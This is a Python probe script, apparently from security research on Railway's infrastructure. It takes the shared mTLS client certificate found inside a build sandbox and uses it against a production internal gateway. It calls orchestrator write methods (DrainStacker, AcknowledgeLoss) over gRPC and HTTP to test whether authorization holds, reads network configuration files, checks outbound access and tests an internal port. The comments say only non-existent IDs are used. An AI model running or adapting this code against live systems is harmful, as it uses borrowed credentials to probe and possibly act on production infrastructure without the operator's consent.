#!/usr/bin/env python3
# i68458: from a Railway datapacket metal build sandbox, use the pooled stacklet
# mTLS cert to talk to external-mtls-service-gateway:443 and decide the
# AUTHORIZATION SEMANTICS of OrchestrationService write methods.
#
# SAFETY: only *non-existent* random UUIDs are used. Only DrainStacker and
# AcknowledgeLoss are probed because static analysis proves both return before any
# write when the id does not exist. Never touches a real stacker/stacklet/deployment.
import os, sys, socket, struct, subprocess, re, json, time, uuid

G = 'https://external-mtls-service-gateway-us-west1.gcp.production.rlwy.net'
CRT = '/pki/client.crt'; KEY = '/pki/client.key'; CA = '/pki/server-ca-bundle.crt'
T0 = time.time()
BUDGET = 380
OUT = []

def log(*a):
    line = "[%6.1fs] %s" % (time.time() - T0, " ".join(str(x) for x in a))
    print(line, flush=True)

def v(n):
    o = bytearray()
    while True:
        b = n & 0x7f; n >>= 7
        if n: o.append(b | 0x80)
        else:
            o.append(b); return bytes(o)

def fb(f, b):
    if isinstance(b, str): b = b.encode()
    return v((f << 3) | 2) + v(len(b)) + b

def call(path, body=b'', t=20, n='1'):
    fu = '/tmp/q' + n
    open(fu, 'wb').write(b'\x00' + struct.pack('>I', len(body)) + body)
    try: os.unlink('/tmp/t' + n)
    except Exception: pass
    q = subprocess.run(['curl', '-sS', '--http2', '--connect-timeout', '8', '-m', str(t),
                        '-o', '/tmp/o' + n, '--trace-ascii', '/tmp/t' + n, '-w', '%{http_code}',
                        '--cert', CRT, '--key', KEY, '--cacert', CA, '-X', 'POST', G + path,
                        '-H', 'te: trailers', '-H', 'content-type: application/grpc',
                        '--data-binary', '@' + fu], capture_output=True, text=True)
    data = open('/tmp/o' + n, 'rb').read() if os.path.exists('/tmp/o' + n) else b''
    tr = open('/tmp/t' + n, 'rb').read().decode('utf-8', 'replace') if os.path.exists('/tmp/t' + n) else ''
    st = re.findall(r'grpc-status:\s*(\d+)', tr, re.I)
    msg = re.findall(r'grpc-message:\s*([^\r\n]*)', tr, re.I)
    pay = b''; i = 0
    while i + 5 <= len(data):
        if data[i] != 0: break
        l = struct.unpack('>I', data[i+1:i+5])[0]
        pay += data[i+5:i+5+l]; i += 5 + l
    return q.stdout.strip(), (int(st[-1]) if st else None), (msg[-1].strip() if msg else ''), pay, tr

def http(path, method='GET', js=None, t=15, n='h'):
    args = ['curl', '-sS', '--http2', '--connect-timeout', '8', '-m', str(t),
            '-o', '/tmp/hb' + n, '-D', '/tmp/hh' + n, '-w', '%{http_code}/%{http_version}',
            '--cert', CRT, '--key', KEY, '--cacert', CA, '-X', method]
    if js is not None:
        args += ['-H', 'content-type: application/json', '--data-binary', js]
    args.append(G + path)
    r = subprocess.run(args, capture_output=True, text=True)
    hh = open('/tmp/hh' + n, 'rb').read().decode('utf-8', 'replace') if os.path.exists('/tmp/hh' + n) else ''
    bb = open('/tmp/hb' + n, 'rb').read()[:600].decode('utf-8', 'replace') if os.path.exists('/tmp/hb' + n) else ''
    return r.stdout.strip(), hh.replace('\r\n', ' | ')[:400], bb

def readf(p, n=2000):
    try: return open(p, 'rb').read().decode('utf-8', 'replace')[:n]
    except Exception as e: return 'ERR %s' % e

log('HOSTN', socket.gethostname())
for p in ('/etc/resolv.conf', '/proc/net/route'):
    log('FILE', p, readf(p).replace('\n', ' | ')[:300])
try:
    log('EGRESS', subprocess.check_output(['curl', '-sS', '-m', '6', 'https://api.ipify.org'], text=True).strip())
except Exception as e:
    log('EGRESS ERR', str(e)[:120])

# ---------------------------------------------------------------- gRPC probes
log('== phase1 gRPC via 443 gateway (mTLS) ==')

h, st, msg, pay, tr = call('/orchestrator.OrchestrationService/Health', b'', 20, 'h')
log('P1_HEALTH http=%s st=%s msg=%s' % (h, st, msg[:120]))
if st != 0:
    log('NETFAIL_VANTAGE_NOT_METAL_EGRESS_OR_GATEWAY_DOWN')
    sys.exit(0)

rid = str(uuid.uuid4())
rid2 = str(uuid.uuid4())
log('RANDOM_IDS', rid, rid2)
time.sleep(4)

# read control: GetDrainStatus is NOT in publicUnaryAllowlist; st=0 proves we are on
# the internal 8775 listener (no authz chain, public=false).
h, st, msg, pay, tr = call('/orchestrator.OrchestrationService/GetDrainStatus', fb(1, rid), 25, 'd')
observed = None
try:
    # minimal protobuf scan for field 3 (bool observed)
    i = 0
    while i < len(pay):
        k = pay[i]; i += 1; f = k >> 3; w = k & 7
        if w == 0:
            x = 0; s = 0
            while True:
                b = pay[i]; i += 1; x |= (b & 0x7f) << s; s += 7
                if not b & 0x80: break
            if f == 3: observed = bool(x)
        elif w == 2:
            l = 0; s = 0
            while True:
                b = pay[i]; i += 1; l |= (b & 0x7f) << s; s += 7
                if not b & 0x80: break
            i += l
        elif w == 5: i += 4
        elif w == 1: i += 8
        else: break
except Exception as e:
    log('PARSE_ERR', repr(e))
log('P2_GETDRAINSTATUS(random) http=%s st=%s observed=%s paylen=%d msg=%s' % (h, st, observed, len(pay), msg[:120]))
time.sleep(4)

# write probe A: DrainStacker on a non-existent id -> static path: GetStacker NotFound
# BEFORE any Fire/Create => zero side effect.
body = fb(1, rid) + fb(2, 'i68458 zero-side-effect authz semantic probe')
h, st, msg, pay, tr = call('/orchestrator.OrchestrationService/DrainStacker', body, 25, 'a')
log('P3_DRAINSTACKER(random) http=%s st=%s msg=%s paylen=%d' % (h, st, msg[:200], len(pay)))
time.sleep(4)

# write probe B: AcknowledgeLoss on a non-existent id -> zone-less path, service.Fire
# deliberately returns ErrInstanceNotFound without minting => zero side effect.
body = fb(1, rid2) + fb(2, 'i68458 zero-side-effect authz semantic probe')
h, st, msg, pay, tr = call('/orchestrator.OrchestrationService/AcknowledgeLoss', body, 25, 'b')
log('P4_ACKNOWLEDGELOSS(random) http=%s st=%s msg=%s paylen=%d' % (h, st, msg[:200], len(pay)))
time.sleep(4)

# prefix-routing control: unimplemented method under the routed prefix must reach the
# orchestrator and come back UNIMPLEMENTED(12) rather than 404/PermissionDenied.
h, st, msg, pay, tr = call('/orchestrator.OrchestrationService/i68458NoSuchMethod', b'', 20, 'c')
log('P5_UNKNOWN_METHOD http=%s st=%s msg=%s' % (h, st, msg[:160]))
time.sleep(3)

# ------------------------------------------------------- HTTP grpc-gateway (8776)
log('== phase2: is the 8776 HTTP gRPC-gateway exposed through 443? ==')
code, hh, bb = http('/api/v1/stacker-health', 'GET', t=15, n='1')
log('H1_GET_LISTSTACKERHEALTH http=%s hdr=%s body=%s' % (code, hh[:250], bb[:200].replace('\n', ' ')))
time.sleep(2)
code, hh, bb = http('/api/v1/stacker-health/%s/drain' % rid, 'GET', t=15, n='2')
log('H2_GET_DRAINSTATUS_HTTP http=%s hdr=%s body=%s' % (code, hh[:250], bb[:200].replace('\n', ' ')))
time.sleep(2)
# POST to the mapped write route with a RANDOM NON-EXISTENT id: even if 8776 were
# reachable, DrainStacker returns NotFound before any write (same proof as P3).
code, hh, bb = http('/api/v1/stacker-health/%s/drain' % rid, 'POST',
                    js=json.dumps({'reason': 'i68458 zero-side-effect http probe'}), t=15, n='3')
log('H3_POST_DRAIN_HTTP(random) http=%s hdr=%s body=%s' % (code, hh[:250], bb[:200].replace('\n', ' ')))
time.sleep(2)
code, hh, bb = http('/i68458-unmapped-control-path', 'GET', t=15, n='4')
log('H4_UNMAPPED_CONTROL http=%s hdr=%s body=%s' % (code, hh[:250], bb[:200].replace('\n', ' ')))

# ------------------------------------------------------------- 8776 reachability
log('== phase3: direct 8776 reachability from datapacket metal builder ==')
for host in ('orchestrator.gcp.production.rlwy.net',):
    try:
        ip = socket.gethostbyname(host)
    except Exception as e:
        ip = None; log('DNS', host, 'ERR', str(e)[:100])
    if ip:
        log('DNS', host, ip)
        s = socket.socket(); s.settimeout(3)
        t = time.time()
        try:
            s.connect((ip, 8776)); r = 'OPEN'
        except Exception as e:
            r = type(e).__name__ + ':' + str(e)[:60]
        finally:
            s.close()
        log('TCP8776', host, ip, r, '%.2fs' % (time.time() - t))

log('DONE dt=%.1f' % (time.time() - T0))
